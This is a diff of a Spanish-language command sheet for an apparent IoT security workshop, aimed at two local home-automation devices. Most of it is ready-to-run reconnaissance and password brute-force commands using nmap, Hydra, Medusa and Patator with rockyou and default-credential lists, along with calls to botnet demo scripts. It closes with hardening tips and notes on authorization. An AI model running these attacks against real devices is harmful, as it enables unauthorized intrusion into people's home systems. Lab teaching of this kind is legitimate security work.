@@ -1,48 +1,280 @@
+
+## Comandos a Utilizar.txt (Actualizado)
+
 # 📍 DISPOSITIVOS OBJETIVO
 # 192.168.86.114 - Control de Sala
 # 192.168.86.115 - Control de Entrada/Garage
 
-# 🔍 VERIFICAR CONECTIVIDAD
-ping 192.168.86.114
-ping 192.168.86.115
+# ============================================
+# 🔧 INSTALACIÓN Y VERIFICACIÓN EN KALI LINUX
+# ============================================
 
-# 🔍 VERIFICAR SERVICIO WEB
+# Verificar herramientas instaladas
+hydra -h
+medusa -h
+nmap --version
+curl --version
+python3 --version
+
+# Instalar herramientas si faltan (Kali Linux)
+sudo apt update
+sudo apt install -y hydra medusa nmap curl python3 python3-pip
+
+# Verificar wordlist rockyou.txt
+ls -lh /usr/share/wordlists/rockyou.txt
+# Si no existe, descomprimir:
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Instalar bibliotecas Python necesarias
+pip3 install requests flask scapy
+
+# ============================================
+# 🔍 VERIFICAR CONECTIVIDAD
+# ============================================
+
+# Ping básico
+ping -c 4 192.168.86.114
+ping -c 4 192.168.86.115
+
+# Verificar servicios web con curl
 curl -I http://192.168.86.114/
 curl -I http://192.168.86.115/
 
-# 🔓 FUERZA BRUTA DISPOSITIVO SALA (114)
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.86.114 http-get / -V -t 5 -f
+# Verificar con timeout (evitar cuelgues)
+curl -I --connect-timeout 5 http://192.168.86.114/
+curl -I --connect-timeout 5 http://192.168.86.115/
 
-# 🔓 FUERZA BRUTA DISPOSITIVO ENTRADA (115) - OPCIÓN 1
-hydra -L ruta_de_wordlist -P /usr/share/wordlists/rockyou.txt 192.168.86.115 http-get / -V -t 5 -f
+# ============================================
+# 🔍 ESCANEO DE RED Y RECONOCIMIENTO
+# ============================================
 
-# 🔓 FUERZA BRUTA DISPOSITIVO ENTRADA (115) - OPCIÓN 2
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.86.115 http-get / -V -t 3 -f -w 20
+# Escaneo rápido de puertos comunes
+nmap -p 80,443,8080,8443 192.168.86.114-115 --open
 
+# Escaneo completo de red local
+nmap -p 80,443 192.168.86.0/24 --open -oN scan_results.txt
+
+# Escaneo detallado con detección de servicios
+nmap -sV -p 80 192.168.86.114
+nmap -sV -p 80 192.168.86.115
+
+# Escaneo con scripts de reconocimiento HTTP
+nmap --script http-enum,http-headers,http-methods -p 80 192.168.86.114
+nmap --script http-enum,http-headers,http-methods -p 80 192.168.86.115
+
+# Escaneo con detección de vulnerabilidades HTTP
+nmap --script http-vuln-* -p 80 192.168.86.114-115
+
+# ============================================
+# 🔓 FUERZA BRUTA - DISPOSITIVO SALA (114)
+# ============================================
+
+# Opción 1: Usuario conocido (admin) - RECOMENDADO
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.86.114 http-get / -V -t 5 -f -w 10
+
+# Opción 2: Con más hilos (más rápido, menos estable)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.86.114 http-get / -V -t 10 -f -w 5
+
+# Opción 3: Guardar resultados en archivo
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.86.114 http-get / -V -t 5 -f -o hydra_sala_114.log
+
+# Opción 4: Usar wordlist más pequeña (más rápida)
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt 192.168.86.114 http-get / -V -t 5 -f
+
+# ============================================
+# 🔓 FUERZA BRUTA - DISPOSITIVO ENTRADA (115)
+# ============================================
+
+# Crear lista de usuarios comunes IoT
+echo -e "admin\nuser\nroot\nguest\noperator\nadministrator\ntest\npi\nraspberry" > iot_users.txt
+
+# Opción 1: Fuerza bruta con lista de usuarios - RECOMENDADO
+hydra -L iot_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.86.115 http-get / -V -t 5 -f -w 10
+
+# Opción 2: Usuario específico (user) con más hilos
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.86.115 http-get / -V -t 10 -f -w 5
+
+# Opción 3: Usuario específico (admin) con menos hilos (más estable)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.86.115 http-get / -V -t 3 -f -w 20
+
+# Opción 4: Usar credenciales por defecto primero (más rápido)
+hydra -L iot_users.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv 192.168.86.115 http-get / -V -t 5 -f
+
+# ============================================
 # 🧪 VERIFICAR CREDENCIALES MANUALMENTE
+# ============================================
+
+# Probar credenciales encontradas
 curl -u admin:123456 http://192.168.86.114/
 curl -u user:12345 http://192.168.86.115/
 curl -u admin:123456 http://192.168.86.115/
 curl -u user:123456 http://192.168.86.115/
 
-# 🧪 VER SOLO CÓDIGO HTTP
+# Ver solo código HTTP (más limpio)
 curl -u user:12345 -I http://192.168.86.115/ | grep "HTTP"
 
+# Probar con autenticación básica y mostrar headers completos
+curl -u admin:123456 -v http://192.168.86.114/ 2>&1 | grep -i "authorization\|http"
+
+# Probar acceso y guardar respuesta
+curl -u admin:123456 http://192.168.86.114/ -o response_114.html
+
+# ============================================
 # 🚀 ATAQUE COMPLETO AUTOMÁTICO
-echo -e "admin\nuser\nroot\nguest\noperator" > iot_users.txt
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.86.114 http-get / -t 5 -f
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.86.115 http-get / -t 5 -f
+# ============================================
 
-# 🔧 HERRAMIENTAS ALTERNATIVAS
-medusa -h 192.168.86.115 -u user -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/ -t 5
-nmap -p 80 --script http-brute 192.168.86.115
+# Crear lista de usuarios IoT comunes
+echo -e "admin\nuser\nroot\nguest\noperator\nadministrator\ntest\npi\nraspberry\nadmin123" > iot_users.txt
 
+# Ataque paralelo a ambos dispositivos (en terminales separadas)
+# Terminal 1:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.86.114 http-get / -V -t 5 -f -o hydra_114.log
+
+# Terminal 2:
+hydra -L iot_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.86.115 http-get / -V -t 5 -f -o hydra_115.log
+
+# ============================================
+# 🔧 HERRAMIENTAS ALTERNATIVAS (KALI LINUX)
+# ============================================
+
+# MEDUSA - Alternativa a Hydra
+medusa -h 192.168.86.115 -u user -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/ -t 5 -v 6
+
+# NMAP con script de fuerza bruta HTTP
+nmap -p 80 --script http-brute --script-args userdb=iot_users.txt,passdb=/usr/share/wordlists/rockyou.txt 192.168.86.115
+
+# PATATOR - Otra alternativa moderna (instalar: sudo apt install patator)
+patator http_fuzz url=http://192.168.86.115/ method=GET auth_type=basic user_pass=FILE0:FILE1 0=iot_users.txt 1=/usr/share/wordlists/rockyou.txt -x ignore:code=401
+
+# ============================================
 # 📋 PARÁMETROS HYDRA EXPLICADOS
-# -l = Usuario específico
-# -L = Archivo de usuarios  
-# -p = Contraseña específica
-# -P = Archivo de contraseñas
-# -V = Modo detallado
-# -t = Hilos simultáneos
-# -f = Parar al primer acierto
-# -w = Tiempo de espera
+# ============================================
+
+# -l = Usuario específico (ej: -l admin)
+# -L = Archivo de usuarios (ej: -L users.txt)
+# -p = Contraseña específica (ej: -p password123)
+# -P = Archivo de contraseñas (ej: -P rockyou.txt)
+# -V = Modo verbose/detallado (muestra cada intento)
+# -t = Hilos simultáneos (ej: -t 5 = 5 intentos paralelos)
+# -f = Parar al primer acierto (first success)
+# -w = Tiempo de espera entre intentos en segundos (ej: -w 10)
+# -o = Archivo de salida para guardar resultados (ej: -o results.log)
+# -s = Puerto específico (si no es el estándar, ej: -s 8080)
+# -e = Probar contraseña vacía y usuario como contraseña (ej: -e nsr)
+
+# ============================================
+# 🎯 RECOMENDACIONES ESPECÍFICAS PARA KALI LINUX
+# ============================================
+
+# 1. OPTIMIZACIÓN DE RENDIMIENTO:
+#    - Usar -t 5-10 para balance entre velocidad y estabilidad
+#    - Reducir -w a 5-10 segundos para ataques más rápidos
+#    - Usar -f para parar al encontrar credenciales
+#    - Usar -e nsr para probar variantes comunes primero
+
+# 2. WORDLISTS ALTERNATIVAS EN KALI:
+#    /usr/share/wordlists/rockyou.txt (más común, 14M contraseñas)
+#    /usr/share/wordlists/fasttrack.txt (más pequeña, más rápida)
+#    /usr/share/seclists/Passwords/Common-Credentials/ (varias listas)
+#    /usr/share/seclists/Passwords/Default-Credentials/ (credenciales por defecto)
+#    /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt (muy grande)
+
+# 3. VERIFICACIÓN DE SERVICIOS:
+#    - Siempre verificar conectividad con ping y curl antes de atacar
+#    - Usar nmap para identificar servicios y versiones
+#    - Verificar que el servicio HTTP esté activo
+#    - Revisar headers HTTP para información adicional
+
+# 4. MONITOREO Y LOGS:
+#    - Usar -o para guardar todos los resultados
+#    - Usar -V para ver progreso en tiempo real
+#    - Revisar logs si el ataque se interrumpe
+#    - Usar screen o tmux para sesiones persistentes
+
+# 5. HERRAMIENTAS COMPLEMENTARIAS:
+#    - Burp Suite: Para análisis manual de HTTP
+#    - OWASP ZAP: Para escaneo automatizado de vulnerabilidades web
+#    - Nikto: Para escaneo de vulnerabilidades en servidores web
+#    - Gobuster/Dirb: Para enumeración de directorios web
+
+# 6. COMANDOS ÚTILES ADICIONALES:
+#    Ver procesos de Hydra en ejecución:
+ps aux | grep hydra
+
+#    Matar proceso de Hydra si se cuelga:
+pkill hydra
+
+#    Verificar espacio en disco (wordlists son grandes):
+df -h
+
+#    Verificar memoria disponible:
+free -h
+
+#    Usar screen para sesiones persistentes:
+screen -S hydra_attack
+#    (Presionar Ctrl+A luego D para desacoplar)
+
+#    Reanudar sesión screen:
+screen -r hydra_attack
+
+# ============================================
+# 🐍 EJECUTAR SCRIPTS PYTHON DEL TALLER
+# ============================================
+
+# Network Scanner
+python3 1-network_scanner.py
+
+# Dictionary Attack
+python3 2-real_dictionary_attack.py
+
+# IoT Analyzer
+python3 3-iot_analyzer.py
+
+# Botnet Demo
+python3 4-botnet_demo.py
+
+# Botnet Web Controller (luego abrir http://localhost:5000)
+python3 5-botnet_web_controller.py
+
+# Security Toolkit
+python3 6-security_tool.py
+
+# ============================================
+# 📊 ANÁLISIS POST-ATAQUE
+# ============================================
+
+# Ver resultados guardados
+cat hydra_114.log
+cat hydra_115.log
+
+# Buscar credenciales exitosas en logs
+grep -i "login\|password\|success" *.log
+
+# Verificar archivos generados
+ls -lh *.json *.log *.txt 2>/dev/null
+
+# Buscar IPs comprometidas
+grep -E "192\.168\.86\.(114|115)" *.log *.json
+
+# ============================================
+# 🔐 COMANDOS DE HARDENING Y PROTECCIÓN
+# ============================================
+
+# Cambiar contraseñas por defecto (después del taller)
+# Acceder a la interfaz web del dispositivo y cambiar credenciales
+
+# Verificar que los servicios no expongan información sensible
+curl -I http://192.168.86.114/ | grep -i "server\|x-powered"
+
+# Escanear vulnerabilidades conocidas
+nmap --script vuln -p 80 192.168.86.114-115
+
+# ============================================
+# 📝 NOTAS FINALES
+# ============================================
+
+# - Siempre trabajar en entorno controlado y aislado
+# - Documentar todos los hallazgos
+# - Cambiar credenciales después del taller
+# - Usar estas herramientas solo con autorización
+# - Enfoque educativo y ético
